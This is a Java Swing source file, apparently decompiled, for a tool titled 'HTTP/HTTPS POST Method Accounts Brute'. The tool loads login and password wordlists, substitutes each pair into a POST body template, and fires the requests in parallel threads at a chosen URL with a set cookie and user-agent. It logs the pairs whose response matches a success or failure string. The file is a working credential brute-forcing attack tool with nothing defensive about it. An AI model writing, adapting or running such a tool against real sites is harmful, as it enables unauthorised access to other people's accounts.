package neko.itskekoffcode.hclient.gui;

import java.awt.Component;
import java.awt.EventQueue;
import java.awt.TextArea;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.util.concurrent.ForkJoinPool;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.stream.Stream;
import javax.net.ssl.HttpsURLConnection;
import javax.swing.DefaultComboBoxModel;
import javax.swing.GroupLayout;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JTextField;
import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.UIManager.LookAndFeelInfo;
import javax.swing.filechooser.FileSystemView;

public class GuiHttpPostBrute extends JFrame {
    private final List<String> logins = new ArrayList();
    private final List<String> passwords = new ArrayList();
    private JButton jButton1;
    private JButton jButton2;
    private JButton jButton3;
    private JComboBox<String> jComboBox1;
    private JLabel jLabel1;
    private JLabel jLabel10;
    private JLabel jLabel2;
    private JLabel jLabel3;
    private JLabel jLabel4;
    private JLabel jLabel5;
    private JLabel jLabel6;
    private JLabel jLabel7;
    private JLabel jLabel8;
    private JLabel jLabel9;
    private JTextField jTextField1;
    private JTextField jTextField10;
    private JTextField jTextField2;
    private JTextField jTextField3;
    private JTextField jTextField4;
    private JTextField jTextField5;
    private JTextField jTextField6;
    private JTextField jTextField7;
    private JTextField jTextField8;
    private JTextField jTextField9;
    private TextArea textArea1;

    public GuiHttpPostBrute() {
        this.initComponents();
    }

    private void initComponents() {
        this.jTextField1 = new JTextField();
        this.jLabel1 = new JLabel();
        this.jLabel2 = new JLabel();
        this.jTextField2 = new JTextField();
        this.textArea1 = new TextArea();
        this.jLabel3 = new JLabel();
        this.jButton1 = new JButton();
        this.jTextField3 = new JTextField();
        this.jLabel4 = new JLabel();
        this.jTextField5 = new JTextField();
        this.jButton2 = new JButton();
        this.jLabel6 = new JLabel();
        this.jTextField6 = new JTextField();
        this.jLabel7 = new JLabel();
        this.jTextField7 = new JTextField();
        this.jButton3 = new JButton();
        this.jTextField4 = new JTextField();
        this.jLabel5 = new JLabel();
        this.jTextField8 = new JTextField();
        this.jLabel8 = new JLabel();
        this.jTextField9 = new JTextField();
        this.jLabel9 = new JLabel();
        this.jComboBox1 = new JComboBox();
        this.jTextField10 = new JTextField();
        this.jLabel10 = new JLabel();
        this.setDefaultCloseOperation(3);
        this.setTitle("HTTP/HTTPS POST Method Accounts Brute");
        this.jTextField1.setToolTipText("");
        this.jTextField1.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                GuiHttpPostBrute.this.jTextField1ActionPerformed(evt);
            }
        });
        this.jLabel1.setText("URL");
        this.jLabel2.setText("Path to list with logins");
        this.jTextField2.setToolTipText("");
        this.jLabel3.setText("Log");
        this.jButton1.setText("Start");
        this.jButton1.setToolTipText("");
        this.jButton1.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                GuiHttpPostBrute.this.jButton1ActionPerformed(evt);
            }
        });
        this.jTextField3.setText("0/0");
        this.jLabel4.setText("Threads");
        this.jTextField5.setText("1");
        this.jTextField5.setToolTipText("");
        this.jButton2.setText("...");
        this.jButton2.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                GuiHttpPostBrute.this.jButton2ActionPerformed(evt);
            }
        });
        this.jLabel6.setText("Allowed/Disallowed context on page");
        this.jTextField6.setToolTipText("");
        this.jTextField6.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                GuiHttpPostBrute.this.jTextField6ActionPerformed(evt);
            }
        });
        this.jLabel7.setText("Path to list with passwords");
        this.jTextField7.setToolTipText("");
        this.jButton3.setText("...");
        this.jButton3.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                GuiHttpPostBrute.this.jButton3ActionPerformed(evt);
            }
        });
        this.jTextField4.setToolTipText("");
        this.jTextField4.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                GuiHttpPostBrute.this.jTextField4ActionPerformed(evt);
            }
        });
        this.jLabel5.setText("POST Request line. For example: name={login}&pass={password}&parameter=value");
        this.jTextField8.setToolTipText("");
        this.jTextField8.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                GuiHttpPostBrute.this.jTextField8ActionPerformed(evt);
            }
        });
        this.jLabel8.setText("Cookie");
        this.jTextField9.setText("Mozilla/5.0");
        this.jTextField9.setToolTipText("");
        this.jTextField9.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                GuiHttpPostBrute.this.jTextField9ActionPerformed(evt);
            }
        });
        this.jLabel9.setText("User-Agent");
        this.jLabel9.setToolTipText("");
        this.jComboBox1.setModel(new DefaultComboBoxModel(new String[]{"By Allowed context on page", "By Disallowed context on page"}));
        this.jTextField10.setText("0");
        this.jTextField10.setToolTipText("");
        this.jTextField10.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                GuiHttpPostBrute.this.jTextField10ActionPerformed(evt);
            }
        });
        this.jLabel10.setText("Delay");
        GroupLayout layout = new GroupLayout(this.getContentPane());
        this.getContentPane().setLayout(layout);
        layout.setHorizontalGroup(layout.createParallelGroup(Alignment.LEADING).addGroup(layout.createSequentialGroup().addContainerGap().addGroup(layout.createParallelGroup(Alignment.LEADING).addComponent(this.jTextField1).addComponent(this.jTextField4).addGroup(layout.createSequentialGroup().addComponent(this.jLabel5).addGap(0, 0, 32767)).addGroup(layout.createSequentialGroup().addGroup(layout.createParallelGroup(Alignment.TRAILING).addComponent(this.jTextField2, Alignment.LEADING, -2, 464, -2).addComponent(this.jLabel1, Alignment.LEADING).addComponent(this.jLabel2, Alignment.LEADING)).addPreferredGap(ComponentPlacement.RELATED).addComponent(this.jButton2, -1, -1, 32767)).addGroup(layout.createSequentialGroup().addGroup(layout.createParallelGroup(Alignment.TRAILING).addComponent(this.jTextField7, Alignment.LEADING, -2, 464, -2).addComponent(this.jLabel7, Alignment.LEADING)).addPreferredGap(ComponentPlacement.RELATED).addComponent(this.jButton3, -1, -1, 32767)).addGroup(layout.createSequentialGroup().addComponent(this.jTextField3).addPreferredGap(ComponentPlacement.UNRELATED).addComponent(this.jButton1, -2, 427, -2)).addGroup(layout.createSequentialGroup().addComponent(this.textArea1, -2, 357, -2).addPreferredGap(ComponentPlacement.RELATED).addGroup(layout.createParallelGroup(Alignment.LEADING).addComponent(this.jTextField5, Alignment.TRAILING).addComponent(this.jTextField6).addComponent(this.jTextField10, Alignment.TRAILING).addGroup(layout.createSequentialGroup().addGroup(layout.createParallelGroup(Alignment.LEADING).addComponent(this.jLabel6).addComponent(this.jLabel4).addComponent(this.jLabel10)).addGap(0, 45, 32767)))).addGroup(Alignment.TRAILING, layout.createSequentialGroup().addGroup(layout.createParallelGroup(Alignment.LEADING).addComponent(this.jLabel8).addComponent(this.jTextField8, -2, 227, -2).addComponent(this.jLabel3)).addPreferredGap(ComponentPlacement.RELATED, -1, 32767).addGroup(layout.createParallelGroup(Alignment.LEADING, false).addComponent(this.jTextField9).addComponent(this.jLabel9).addGroup(Alignment.TRAILING, layout.createSequentialGroup().addGap(46, 46, 46).addComponent(this.jComboBox1, 0, 218, 32767))))).addContainerGap()));
        layout.setVerticalGroup(layout.createParallelGroup(Alignment.LEADING).addGroup(layout.createSequentialGroup().addGap(7, 7, 7).addComponent(this.jLabel1).addPreferredGap(ComponentPlacement.RELATED).addComponent(this.jTextField1, -2, -1, -2).addPreferredGap(ComponentPlacement.RELATED).addComponent(this.jLabel2).addPreferredGap(ComponentPlacement.RELATED).addGroup(layout.createParallelGroup(Alignment.TRAILING).addComponent(this.jTextField2, -2, -1, -2).addComponent(this.jButton2)).addPreferredGap(ComponentPlacement.RELATED).addComponent(this.jLabel7).addPreferredGap(ComponentPlacement.RELATED).addGroup(layout.createParallelGroup(Alignment.TRAILING).addComponent(this.jTextField7, -2, -1, -2).addComponent(this.jButton3)).addGap(18, 18, 18).addComponent(this.jLabel5).addPreferredGap(ComponentPlacement.RELATED).addComponent(this.jTextField4, -2, -1, -2).addGroup(layout.createParallelGroup(Alignment.LEADING).addGroup(layout.createSequentialGroup().addGroup(layout.createParallelGroup(Alignment.BASELINE).addComponent(this.jLabel8).addComponent(this.jLabel9)).addPreferredGap(ComponentPlacement.RELATED).addComponent(this.jTextField8, -2, -1, -2)).addGroup(layout.createSequentialGroup().addGap(20, 20, 20).addComponent(this.jTextField9, -2, -1, -2))).addPreferredGap(ComponentPlacement.RELATED, 21, 32767).addGroup(layout.createParallelGroup(Alignment.LEADING).addComponent(this.jComboBox1, Alignment.TRAILING, -2, 20, -2).addComponent(this.jLabel3, Alignment.TRAILING)).addPreferredGap(ComponentPlacement.RELATED).addGroup(layout.createParallelGroup(Alignment.LEADING, false).addGroup(Alignment.TRAILING, layout.createSequentialGroup().addComponent(this.jLabel6).addPreferredGap(ComponentPlacement.RELATED).addComponent(this.jTextField6, -2, -1, -2).addGap(1, 1, 1).addComponent(this.jLabel4).addPreferredGap(ComponentPlacement.RELATED).addComponent(this.jTextField5, -2, -1, -2).addPreferredGap(ComponentPlacement.RELATED).addComponent(this.jLabel10).addPreferredGap(ComponentPlacement.RELATED).addComponent(this.jTextField10, -2, -1, -2)).addComponent(this.textArea1, -1, -1, 32767)).addPreferredGap(ComponentPlacement.RELATED, -1, 32767).addGroup(layout.createParallelGroup(Alignment.BASELINE).addComponent(this.jButton1, -1, 54, 32767).addComponent(this.jTextField3, -2, -1, -2))));
        this.pack();
    }

    private void jTextField1ActionPerformed(ActionEvent evt) {
    }

    private void jButton1ActionPerformed(ActionEvent evt) {
        this.logins.clear();
        this.passwords.clear();
        (new Thread() {
            int count = 0;

            public void run() {
                try {
                    File file = new File(GuiHttpPostBrute.this.jTextField2.getText());
                    BufferedReader br = new BufferedReader(new FileReader(file));

                    String line;
                    while((line = br.readLine()) != null) {
                        GuiHttpPostBrute.this.logins.add(line);
                    }

                    File file2 = new File(GuiHttpPostBrute.this.jTextField7.getText());
                    BufferedReader br2 = new BufferedReader(new FileReader(file2));

                    String line2;
                    while((line2 = br2.readLine()) != null) {
                        GuiHttpPostBrute.this.passwords.add(line2);
                    }

                    List<String> params = new ArrayList();
                    Iterator var9 = GuiHttpPostBrute.this.passwords.iterator();

                    while(var9.hasNext()) {
                        String s2 = (String)var9.next();
                        Iterator var11 = GuiHttpPostBrute.this.logins.iterator();

                        while(var11.hasNext()) {
                            String s1 = (String)var11.next();
                            String par = GuiHttpPostBrute.this.jTextField4.getText().replace("{login}", s1).replace("{password}", s2);
                            params.add(par);
                        }
                    }

                    GuiHttpPostBrute.this.jTextField3.setText("0/" + params.size());
                    ForkJoinPool forkJoinPool = new ForkJoinPool(Integer.parseInt(GuiHttpPostBrute.this.jTextField5.getText()));
                    forkJoinPool.submit(() -> {
                        Arrays.stream(params.toArray()).parallel().forEach((par) -> {
                            this.goByContext(par.toString());
                        });
                    });
                } catch (Exception var13) {
                }

            }

            private void goByContext(String par) {
                try {
                    if (this.pageContainsContext(par)) {
                        GuiHttpPostBrute.this.textArea1.append(GuiHttpPostBrute.this.jTextField1.getText() + "?" + par + "\n");
                    }
                } catch (Exception var4) {
                    var4.printStackTrace();
                }

                ++this.count;
                GuiHttpPostBrute.this.jTextField3.setText(this.count + "/" + GuiHttpPostBrute.this.logins.size() * GuiHttpPostBrute.this.passwords.size());

                try {
                    Thread.sleep(Integer.parseInt(GuiHttpPostBrute.this.jTextField10.getText()));
                } catch (InterruptedException var3) {
                }

            }

            private boolean pageContainsContext(String params) throws Exception {
                StringBuffer response = new StringBuffer();
                URL obj = new URL(GuiHttpPostBrute.this.jTextField1.getText());
                DataOutputStream wr;
                BufferedReader in;
                String inputLine;
                if (GuiHttpPostBrute.this.jTextField1.getText().startsWith("https://")) {
                    HttpsURLConnection conx = (HttpsURLConnection)obj.openConnection();
                    conx.setRequestMethod("POST");
                    conx.setRequestProperty("User-Agent", GuiHttpPostBrute.this.jTextField9.getText());
                    conx.setRequestProperty("Cookie", GuiHttpPostBrute.this.jTextField8.getText());
                    conx.setDoOutput(true);
                    wr = new DataOutputStream(conx.getOutputStream());
                    wr.writeBytes(params);
                    wr.flush();
                    in = new BufferedReader(new InputStreamReader(conx.getInputStream()));

                    while((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
                } else {
                    HttpURLConnection con = (HttpURLConnection)obj.openConnection();
                    con.setRequestMethod("POST");
                    con.setRequestProperty("User-Agent", GuiHttpPostBrute.this.jTextField9.getText());
                    con.setRequestProperty("Cookie", GuiHttpPostBrute.this.jTextField8.getText());
                    con.setDoOutput(true);
                    wr = new DataOutputStream(con.getOutputStream());
                    wr.writeBytes(params);
                    wr.flush();
                    in = new BufferedReader(new InputStreamReader(con.getInputStream()));

                    while((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
                }

                System.out.println(response);
                if (GuiHttpPostBrute.this.jComboBox1.getSelectedItem().toString().equals("By Allowed context on page")) {
                    return response.toString().contains(GuiHttpPostBrute.this.jTextField6.getText());
                } else {
                    return !response.toString().contains(GuiHttpPostBrute.this.jTextField6.getText());
                }
            }
        }).start();
    }

    private void jButton2ActionPerformed(ActionEvent evt) {
        JFileChooser jfc = new JFileChooser(FileSystemView.getFileSystemView().getHomeDirectory());
        int returnValue = jfc.showOpenDialog(null);
        if (returnValue == 0) {
            File selectedFile = jfc.getSelectedFile();
            this.jTextField2.setText(selectedFile.getAbsolutePath());
        }

    }

    private void jTextField6ActionPerformed(ActionEvent evt) {
    }

    private void jButton3ActionPerformed(ActionEvent evt) {
    }

    private void jTextField4ActionPerformed(ActionEvent evt) {
    }

    private void jTextField8ActionPerformed(ActionEvent evt) {
    }

    private void jTextField9ActionPerformed(ActionEvent evt) {
    }

    private void jTextField10ActionPerformed(ActionEvent evt) {
    }

    public static void main(String[] args) {
        try {
            LookAndFeelInfo[] var4;
            int var3 = (var4 = UIManager.getInstalledLookAndFeels()).length;

            for(int var2 = 0; var2 < var3; ++var2) {
                LookAndFeelInfo info = var4[var2];
                if ("Nimbus".equals(info.getName())) {
                    UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException var5) {
            Logger.getLogger(GuiHttpPostBrute.class.getName()).log(Level.SEVERE, null, var5);
        } catch (InstantiationException var6) {
            Logger.getLogger(GuiHttpPostBrute.class.getName()).log(Level.SEVERE, null, var6);
        } catch (IllegalAccessException var7) {
            Logger.getLogger(GuiHttpPostBrute.class.getName()).log(Level.SEVERE, null, var7);
        } catch (UnsupportedLookAndFeelException var8) {
            Logger.getLogger(GuiHttpPostBrute.class.getName()).log(Level.SEVERE, null, var8);
        }

        EventQueue.invokeLater(new Runnable() {
            public void run() {
                (new GuiHttpPostBrute()).setVisible(true);
            }
        });
    }
}
